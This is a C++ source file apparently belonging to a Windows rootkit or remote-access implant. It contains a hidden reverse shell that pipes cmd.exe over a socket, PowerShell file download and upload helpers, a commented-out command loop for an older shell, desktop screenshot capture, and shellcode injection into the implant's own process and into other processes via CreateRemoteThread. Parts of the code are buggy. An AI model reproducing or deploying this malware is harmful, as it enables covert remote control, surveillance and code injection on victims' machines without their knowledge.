#include "RootKit.h"
//void exec2(char* buffer, char *fileexec)
//{
//	if (32 >= (int)(ShellExecute(NULL, "open", fileexec, NULL, NULL, SW_HIDE)))
//	{
//		strcat(buffer, "[x] Error executing buffer..\n");
//	}
//	else
//	{
//		strcat(buffer, "\n");
//	}
//}
BOOL IsWow64(HANDLE process)
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(process, &bIsWow64))
		{
			//handle error
		}
	}
	return bIsWow64;
}

bool IsX86Process(HANDLE process)
{
	SYSTEM_INFO systemInfo = {0};
	GetNativeSystemInfo(&systemInfo);

	// x86 environment
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return true;

	// Check if the process is an x86 process that is running on x64 environment.
	// IsWow64 returns true if the process is an x86 process
	return IsWow64(process);
}

string getProcesses()
{
	string s;
	WTS_PROCESS_INFO *pWPIs = NULL;
	DWORD dwProcCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
	{
		SYSTEM_INFO lpInfo = {0};
		GetNativeSystemInfo(&lpInfo);
		lpInfo.wProcessorArchitecture;
		//Go through all processes retrieved
		for (DWORD i = 0; i < dwProcCount; i++)
		{
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
											  PROCESS_VM_READ,
										  FALSE, pWPIs[i].ProcessId);
			s.append(pWPIs[i].pProcessName).append("\t").append(to_string(pWPIs[i].ProcessId)).append("\t");
			if (IsX86Process(hProcess))
				s.append("32bit\n");
			else
				s.append("64bit\n");
		}
	}

	return s;
	//Free memory
	if (pWPIs)
	{
		WTSFreeMemory(pWPIs);
		pWPIs = NULL;
	}
}

void random_str(char *s, const int len)
{
	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i)
	{
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

void split(char *command, char splitted[2][100])
{
	memset(splitted, 0, sizeof(splitted[0][0]) * 100 * 2);
	int j = 0;
	for (char *i = command; *i != ' '; i++)
	{
		splitted[0][j] = *i;
		j++;
	}
	int k = 0;
	for (char *i = command + j + 1; *i != '\0'; i++)
	{
		splitted[1][k] = *i;
		k++;
	}
}

void inplace_reverse(char *str)
{
	if (str)
	{
		char *end = str + strlen(str) - 1;

		// swap the values in the two given variables
		// XXX: fails when a and b refer to same memory location
#define XOR_SWAP(a, b) \
	do                 \
	{                  \
		a ^= b;        \
		b ^= a;        \
		a ^= b;        \
	} while (0)

		// walk inwards from both ends of the string,
		// swapping until we get to the middle
		while (str < end)
		{
			XOR_SWAP(*str, *end);
			str++;
			end--;
		}
#undef XOR_SWAP
	}
}

void getFileFromURL(char *url, char *filename)
{
	memset(filename, 0, sizeof(filename));
	int j = 0;
	for (char *i = &url[strlen(url) - 1]; *i != '/'; i--)
	{
		filename[j] = *i;
		j++;
	}
	inplace_reverse(filename);
	strcat(filename, " 2>&1");
}

std::string exec(const char *cmd)
{
	char buffer[128];
	std::string result = "";
	FILE *pipe = _popen(cmd, "r");
	try
	{
		while (fgets(buffer, sizeof buffer, pipe) != NULL)
		{
			result += buffer;
		}
	}
	catch (exception e)
	{
		result += e.what();
		_pclose(pipe);
	}
	_pclose(pipe);
	return result;
}

void uploadUrl(char *filename, char *buffer)
{
	//memset(buffer, 0, sizeof(buffer));
	FILE *pipe = _popen(strcat(strcat("powershell.exe invoke-webrequest -method put ", filename), " 2>&1"), "r");
	fread(buffer, sizeof(char), sizeof(char) * sizeof(buffer), pipe);
	_pclose(pipe);
}

void downloadUrl(char *url, char *buffer)
{
	char filename[30];
	getFileFromURL(url, filename);
	strcat(url, ",");
	FILE *pipe = _popen(strcat(strcat("powershell.exe $client = New-object System.Net.WebClient; $client.DownloadFile(", url), filename), "r");
	fread(buffer, sizeof(char), sizeof(char) * sizeof(buffer), pipe);
	_pclose(pipe);
}

void whoami(char *buffer)
{
	DWORD buflen = 257;
	GetUserNameA(buffer, &buflen);
	strcat(buffer, "\n");
}

void hostname(char *buffer)
{
	DWORD buflen = 257;
	GetComputerNameA(buffer, &buflen);
	strcat(buffer, "\n");
}

void pwd(char *buffer)
{
	CHAR tempvar[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, tempvar);
	strcat(buffer, tempvar);
	strcat(buffer, "\n");
}

void RevShell(const char *host, const char *port)
{
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(host, port, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}

//
//void RevShell() old reverse shell
//{
//	WSADATA wsaver;
//	WSAStartup(MAKEWORD(2, 2), &wsaver);
//	SOCKET tcpsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//	sockaddr_in addr;
//	addr.sin_family = AF_INET;
//	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
//	addr.sin_port = htons(4444);
//	if (connect(tcpsocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
//		closesocket(tcpsocket);
//		WSACleanup();
//		exit(0);
//	}
//	else
//	{
//		char recieved[BUFLEN] = "";
//		char buf_to_be_sent[1257] = "";
//		char splitted[10][100];
//		while (true)
//		{
//			int result = recv(tcpsocket, recieved, BUFLEN, 0);
//			char *src, *dst;
//			for (src = dst = recieved; *src != '\0'; src++) {
//				*dst = *src;
//				if (*dst != '\n' && *dst != '\r') dst++;
//			}
//			*dst = '\0';
//			split(recieved, splitted);
//			if (strcmp(recieved, "whoami") == 0)
//			{
//				whoami(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "pwd") == 0)
//			{
//				pwd(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "hostname") == 0)
//			{
//				hostname(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "exit") == 0)
//			{
//				closesocket(tcpsocket);
//				WSACleanup();
//				exit(0);
//			}
//			else if (strcmp(splitted[0], "download") == 0)
//			{
//				downloadUrl(splitted[1], buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(splitted[0], "upload") == 0)
//			{
//				uploadUrl(splitted[1], buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else
//			{
//				strcpy(buf_to_be_sent, exec(recieved).c_str());
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			memset(buf_to_be_sent, 0, sizeof(buf_to_be_sent));
//			memset(recieved, 0, sizeof(recieved));
//		}
//
//	}
//	closesocket(tcpsocket);
//	WSACleanup();
//	exit(0);
//}

void screenshot(string file)
{
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

	HDC dc = GetDC(GetDesktopWindow()); //get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	//copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(), &rc0kno); // get desktop size;
	int w = rc0kno.right - rc0kno.left;			//width
	int h = rc0kno.bottom - rc0kno.top;			//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h); //create bitmap
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY); //copy pixel from pulpit to bitmap
	Bitmap *bm = new Bitmap(hbitmap, NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num, &size); //get count of codec

	imagecodecinfo = (ImageCodecInfo *)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo); //get codec

	CLSID clsidEncoder;

	for (int i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid; //get jpeg codec id
	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(), file.end()); //sring to wstring
	bm->Save(ws.c_str(), &clsidEncoder); //save in jpeg format
	SelectObject(dc2, holdbitmap);		 //Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(), dc);
	GdiplusShutdown(gdiplustoken);
}

void FreeScreenshot(char *data)
{
	GlobalFree((HGLOBAL)data);
}

char *CaptureScreenshot()
{
	HDC hdcScr, hdcMem;

	HBITMAP hBitmap;
	BITMAP bmp;

	int xRes, yRes;

	hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
	hdcMem = CreateCompatibleDC(hdcScr);

	xRes = GetDeviceCaps(hdcScr, HORZRES);
	yRes = GetDeviceCaps(hdcScr, VERTRES);

	hBitmap = CreateCompatibleBitmap(hdcScr, xRes, yRes);

	if (hBitmap == 0)
		return NULL;

	if (!SelectObject(hdcMem, hBitmap))
		return NULL;

	if (!StretchBlt(hdcMem, 0, 0, xRes, yRes, hdcScr, 0, 0, xRes, yRes, SRCCOPY))
		return NULL;

	PBITMAPINFO pbmi;
	WORD cClrBits;

	if (!GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bmp))
		return NULL;

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);

	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else
		cClrBits = 32;

	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8 * pbmi->bmiHeader.biHeight * cClrBits;

	pbmi->bmiHeader.biClrImportant = 0;

	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;

	DWORD dwTotal;
	DWORD cb;
	char *lpBits;
	char *hp;

	DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (char *)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits)
		return NULL;

	if (!GetDIBits(hdcMem, hBitmap, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS))
	{
		GlobalFree(lpBits);
		return NULL;
	}

	hdr.bfType = 0x4d42;

	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);

	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);

	cb = pbih->biSizeImage;

	DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD);
	dwSize += cb;

	char *image = (char *)GlobalAlloc(GMEM_FIXED, dwSize);
	memcpy_s(image, dwSize, &hdr, sizeof(BITMAPFILEHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER), dwSize - sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), dwSize - sizeof(BITMAPFILEHEADER) - sizeof(BITMAPINFOHEADER), lpBits, cb);

	GlobalFree((HGLOBAL)lpBits);

	ReleaseDC(0, hdcScr);
	ReleaseDC(0, hdcMem);

	return image;
}

static inline bool is_base64(unsigned char c)
{
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_decode(std::string const &encoded_string)
{

	static const std::string base64_chars =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_]))
	{
		char_array_4[i++] = encoded_string[in_];
		in_++;
		if (i == 4)
		{
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i)
	{
		for (j = 0; j < i; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

		for (j = 0; (j < i - 1); j++)
			ret += char_array_3[j];
	}

	return ret;
}

void injectFPT(const char *payload)
{
	void *exec = VirtualAlloc(0, sizeof payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, payload, sizeof payload);
	((void (*)())exec)();
}

void injectCT(const char *payload)
{
	LPVOID lpvAddr; // address of the test memory
	HANDLE hHand;
	DWORD dwWaitResult;
	DWORD threadID;
	lpvAddr = VirtualAlloc(0, strlen(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(lpvAddr, payload, strlen(payload));
	hHand = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, 0, 0, &threadID);
	dwWaitResult = WaitForSingleObject(hHand, INFINITE);
}

void pid_inject(int pid, const char *shellcode)
{
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
}
